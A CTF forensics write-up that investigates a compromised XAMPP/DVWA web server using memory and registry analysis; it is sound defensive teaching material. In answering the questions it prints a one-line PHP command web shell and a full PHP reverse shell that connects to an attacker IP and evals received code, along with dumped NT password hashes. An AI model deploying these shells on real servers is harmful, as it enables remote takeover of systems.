# Challenge Description

Injector is a Windows & Memory Forensics  challenge on cyberdefenders.org and we can find it [here](https://cyberdefenders.org/labs/23) 

A companyâ€™s web server has been breached through their website. Our team arrived just in time to take a forensic image of the running system and its memory for further analysis. As a security analyst, you are tasked with mounting the image to determine how the system was compromised and the actions/commands the attacker executed.

here we have two files that we will investigate ***memdump.mem*** It's a memory dump and there also a ***s4a-challenge4*** it's a Mounted image and there is a ***Web Server*** inside the mounted image 

# Challenge Questions walkthrough

1. **What is the computer's name?**

   We can find the computer's name with two methods

   First Method from **Registry Hives**

   First we have to get the ***Registry Hives*** from `\Windows\System32\config` and to get the time zone we will parse the ***SYSTEM registry hive*** through Registry Explorer tool.

   To get the Computer name we will follow   ***SYSTEM*** &rarr;   ***ControlSet001*** &rarr;   ***Control*** &rarr;   ***ComputerName***  &rarr;   ***ComputerName*** 

    [![](/assets/images/CTF-Writeups/Injector/Q1.jpg)](/assets/images/CTF-Writeups/Injector/Q1.jpg)

   and we will find the computer name.

   <br>

   Second Method from **Memory dump** 

   here what should we do is knowing the environment variables 

   ```bash
   volatility.exe -f memdump.mem --profile=VistaSP2x86 envars  >>envars.txt
   ```

   this is the file that we saved [envars.txt](/assets/files/CTF-Writeups/Injector/envars.txt)  

   in the output, there is the name of the computer under: COMPUTERNAME: WIN-L0ZZQ76PMUF

   The answer: **WIN-L0ZZQ76PMUF**

2. **What is the Timezone of the compromised machine? Format: UTC+0 (no-space)**

   we have already got the ***Registry Hives*** and we parsing the SYSTEM indeed 

   to get the time zone can be found from  ***SYSTEM*** &rarr;   ***ControlSet001*** &rarr;   ***Control*** &rarr;   ***TimeZoneInformation*** 

    [![](/assets/images/CTF-Writeups/Injector/Q2.jpg)](/assets/images/CTF-Writeups/Injector/Q2.jpg)

   From the the result we got and the ActiveTimeBias we know that it's UTC-7 and also if we search google about Pacific Time Zone we will find that 

   Coordinated Universal Time is 7 hours ahead of Pacific Time 

   The answer: **UTC-7**

3. **What was the first vulnerability the attacker was able to exploit?**

   in the Web server that we can find in `[root]\xampp` if we analyze the logs specifically access.log that can be found in `[root]\xampp\apache\logs\access.log` we will find that it's XSS the first vulnerability the attacker was able to exploit

    [![](/assets/images/CTF-Writeups/Injector/Q3.jpg)](/assets/images/CTF-Writeups/Injector/Q3.jpg)

   The answer: **XSS**

4. **What is the OS build number?**

   we can find the the OS's build number in the CurrentVersion which we can find it in   ***SOFTWARE*** &rarr;   ***Microsoft*** &rarr;   ***Windows NT*** &rarr;   ***CurrentVersion***  and we found that the build number.

    [![](/assets/images/CTF-Writeups/Injector/Q4.jpg)](/assets/images/CTF-Writeups/Injector/Q4.jpg)

   The answer: **6001**

5. **How many users are on the compromised machine?** 

   In ***SAM Hive*** when we check the ***Users*** which we can find in  ***SAM*** &rarr; ***Domains*** &rarr;  ***Account*** &rarr; ***Users*** 

   we will notice that there are 4 users

    [![](/assets/images/CTF-Writeups/Injector/Q5.jpg)](/assets/images/CTF-Writeups/Injector/Q5.jpg)

   The answer: **4**

6. **What is the webserver package installed on the machine?**

   Back to Question 3 we know that it's ***xampp***

   The answer: **xampp**

7. **What is the name of the vulnerable web app installed on the webserver?**

   Also from the Question 3 when we open the ***access.log*** we found that the vulnerable web app is ***dvwa***

   The answer: **dvwa**

8. **What is the user agent used in the HTTP requests sent by the SQL injection attack tool?**

   here we want to know the user agent used in the HTTP requests sent by the SQL injection attack tool, so we simply will check and filter the user agents that used in access.log

   ```bash
   cat access.log | grep "/dvwa/vulnerabilities/fi" | cut -d '"' -f2 | sort -u
   ```

   and we found that it's a sqlmap user agent 

    [![](/assets/images/CTF-Writeups/Injector/Q8.jpg)](/assets/images/CTF-Writeups/Injector/Q8.jpg)

   The answer: **sqlmap/1.0-dev-nongit-20150902Hint**

9. **The attacker read multiple files through LFI vulnerability. One of them is related to network configuration. What is the filename?**

   here what we have to do is is to check the File Inclusion vulnerabilities directory and list the unique values without repetition

   ```bash
   cat access.log | grep "/dvwa/vulnerabilities/fi" | cut -d '"' -f2 | sort -u
   ```

    [![](/assets/images/CTF-Writeups/Injector/Q9.jpg)](/assets/images/CTF-Writeups/Injector/Q9.jpg)

   and found that it's the hosts

   The answer: **hosts**

10. **The attacker tried to update some firewall rules using netsh command. Provide the value of the type parameter in the executed command?**

    Here we will back again to ***memory dumb*** and analyze it using  ***volatility***

    here we have to check the cmd commands plugin

    ```bash
    volatility.exe -f memdump.mem --profile=VistaSP2x86 cmdscan >>cmdscan.txt
    ```

    this is the file that we saved [cmdscan.txt](/assets/files/CTF-Writeups/Injector/cmdscan.txt)  

    from the last result we found that the rule is: remotedesktop 

    The answer: **remotedesktop **

11. **How many users were added by the attacker?**

    here we have to list the ***virtual address of hives*** 

    ```bash
    volatility.exe -f memdump.mem --profile=VistaSP2x86 hivelist
    ```

     and the result we got is:

    ```bash
    Volatility Foundation Volatility Framework 2.3.1
    Virtual    Physical   Name
    ---------- ---------- ----
    0x87b4ba20 0x3c0c0a20 \Device\HarddiskVolume1\Windows\System32\config\COMPONENTS
    0x87b55a20 0x3c192a20 \Device\HarddiskVolume1\Windows\System32\config\SOFTWARE

    0x87b17a20 0x3c1f5a20 \Device\HarddiskVolume1\Windows\System32\config\SECURITY
    ```

    back to result we found when running cmdscan (result can be found in the question 10) we can notice also that the attacker add user1 and he also has a hacker user 

    and here we have to run ***hashdump*** plugin 

    ```bash
    volatility.exe -f memdump.mem --profile=VistaSP2x86 hashdump -y 0x86226008 -s 0x87b7d008
    ```

     and the result we got is: 

    ```bash
    Volatility Foundation Volatility Framework 2.3.1
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:63d6a39b8467b94ae92ab1931d4079dd:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    user1:1005:aad3b435b51404eeaad3b435b51404ee:817875ce4794a9262159186413772644:::
    hacker:1006:aad3b435b51404eeaad3b435b51404ee:817875ce4794a9262159186413772644:::
    ```

    here we found that The user "hacker" has the same NT hash of the user1 who has been added by the attacker

    The answer: **2**

12. **When did the attacker create the first user**

    back to Question 5 will also find the users timestamp and the first user created ***2015-09-02 09:05:06*** and it's user 1 then hacker ***2015-09-02 09:05:25***

    **using different tool and get the same result** 

    also if we analyze the ***SAM hive*** using **regrip** we will get also the users and it's timestamp like creation time and so on.

    The answer: **2015-09-02 09:05:06 UTC**

13. **What is the NThash of the user's password set by the attacker?**

    back to Question 11 when we got this result

    ```bash
    Volatility Foundation Volatility Framework 2.3.1
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:63d6a39b8467b94ae92ab1931d4079dd:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    user1:1005:aad3b435b51404eeaad3b435b51404ee:817875ce4794a9262159186413772644:::
    hacker:1006:aad3b435b51404eeaad3b435b51404ee:817875ce4794a9262159186413772644:::
    ```

    we here have the hacker, user1, Guest NThash and what we want here is NT of the attacker only 

    The answer: **817875ce4794a9262159186413772644**

14. **What is The MITRE ID corresponding to the technique used to keep persistence?**

    back to Question 10 when we found that:

    ```bash
    Cmd #9 @ 0x5a34f48: net localgroup "Remote Desktop Users" user1 /add
    ```

    here we have to know the ***MITRE ID*** which we can found in [techniques docs](https://attack.mitre.org/techniques/enterprise/) and to create account the id is: **T1136** and user /add is a Local account and it's ID is:  **.001** so the ***MITRE ID*** is : ***T1136.001*** 

     [![](/assets/images/CTF-Writeups/Injector/Q14.jpg)](/assets/images/CTF-Writeups/Injector/Q14.jpg)

    The answer: **T1136.001 **

15. **The attacker uploaded a simple command shell through file upload vulnerability. Provide the name of the URL parameter used to execute commands?**

    after explore mounted drive and ***xampp*** directory i found the the two shell **phpshell.php** and **phpshell2.php** uploaded in this path `\xampp\htdocs\DVWA\hackable\uploads`  and here the content of the two files:

    ```php+HTML
    <?php
    system($_GET["cmd"]);
    ?>
    ```

    ```php+HTML
    //<?php error_reporting(0); $ip = '192.168.56.102'; $port = 4545; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } elseif (($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } elseif (($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } else { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; eval($b); die();
    ```

    and in the phpshell.php the name of the URL parameter is cmd

    The answer: **cmd**

16. **One of the uploaded files by the attacker has an md5 that starts with "559411". Provide the full hash.**

    first, I check the ***MD5*** of the **phpshell.php** and **phpshell2.php** files and it does not start with the same hash so I also back to the content of DVWA and check some of them

     [![](/assets/images/CTF-Writeups/Injector/Q16p1.jpg)](/assets/images/CTF-Writeups/Injector/Q16p1.jpg)

     [![](/assets/images/CTF-Writeups/Injector/Q16p2.jpg)](/assets/images/CTF-Writeups/Injector/Q16p2.jpg)

    so I have the valid one and it's ***webshell.php*** and the ***md5*** is **"5594112b531660654429f8639322218b"**

    The answer: **5594112b531660654429f8639322218b**

17. **The attacker used Command Injection to add user "hacker" to the "Remote Desktop Users" Group. Provide the IP address that was part of the executed command?**

    Back again to **Memory dumb** 

    First I run **pslist** to list the processes of a system 

    ```bash
    volatility.exe -f memdump.mem --profile=VistaSP2x86 pslist
    ```

    this is the file that we saved [pslist.txt](/assets/files/CTF-Writeups/Injector/pslist.txt)  

    The PID **2880**  and **2796** is the most interested as it's the **httpd.exe** PID and we dump **2880**  as it the last one 

    ```bash
    volatility.exe -f memdump.mem --profile=VistaSP2x86 --profile=Win2008SP1x86 memdump --pid 2880 --dump-dir ./
    ```

    Then I show the strings of the **2880** dump and then grep all ip address format 

    ```bash
    strings 2880.dmp >> stings-dump
    cat stings-dump | grep  '^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort -u >> ip-stings-dump.txt
    ```

    this is the file that we saved [ip-stings-dump.txt](/assets/files/CTF-Writeups/Injector/ip-stings-dump.txt)  

    And we found that **192.168.56.102** make many requisites try to exploit vulnerabilities like xss and file inclusion

    The answer: **192.168.56.102**

18. The attacker dropped a shellcode through SQLi vulnerability. The shellcode was checking for a specific version of PHP. Provide the PHP version number?

    I start to get all SQLI logs and then remove repeated lines then I save them into a file to check them 

    ```bash
    cat access.log | grep sqli | sort -u >> sqli-logs.txt
    ```

    I start to check them from the bottom of the list (it's logic that the last one is the valid payload) and start to decode them in the **cyber chef** tool and the version of PHP is 4.1.0

     [![](/assets/images/CTF-Writeups/Injector/Q18.jpg)](/assets/images/CTF-Writeups/Injector/Q18.jpg)

    The answer: **4.1.0**
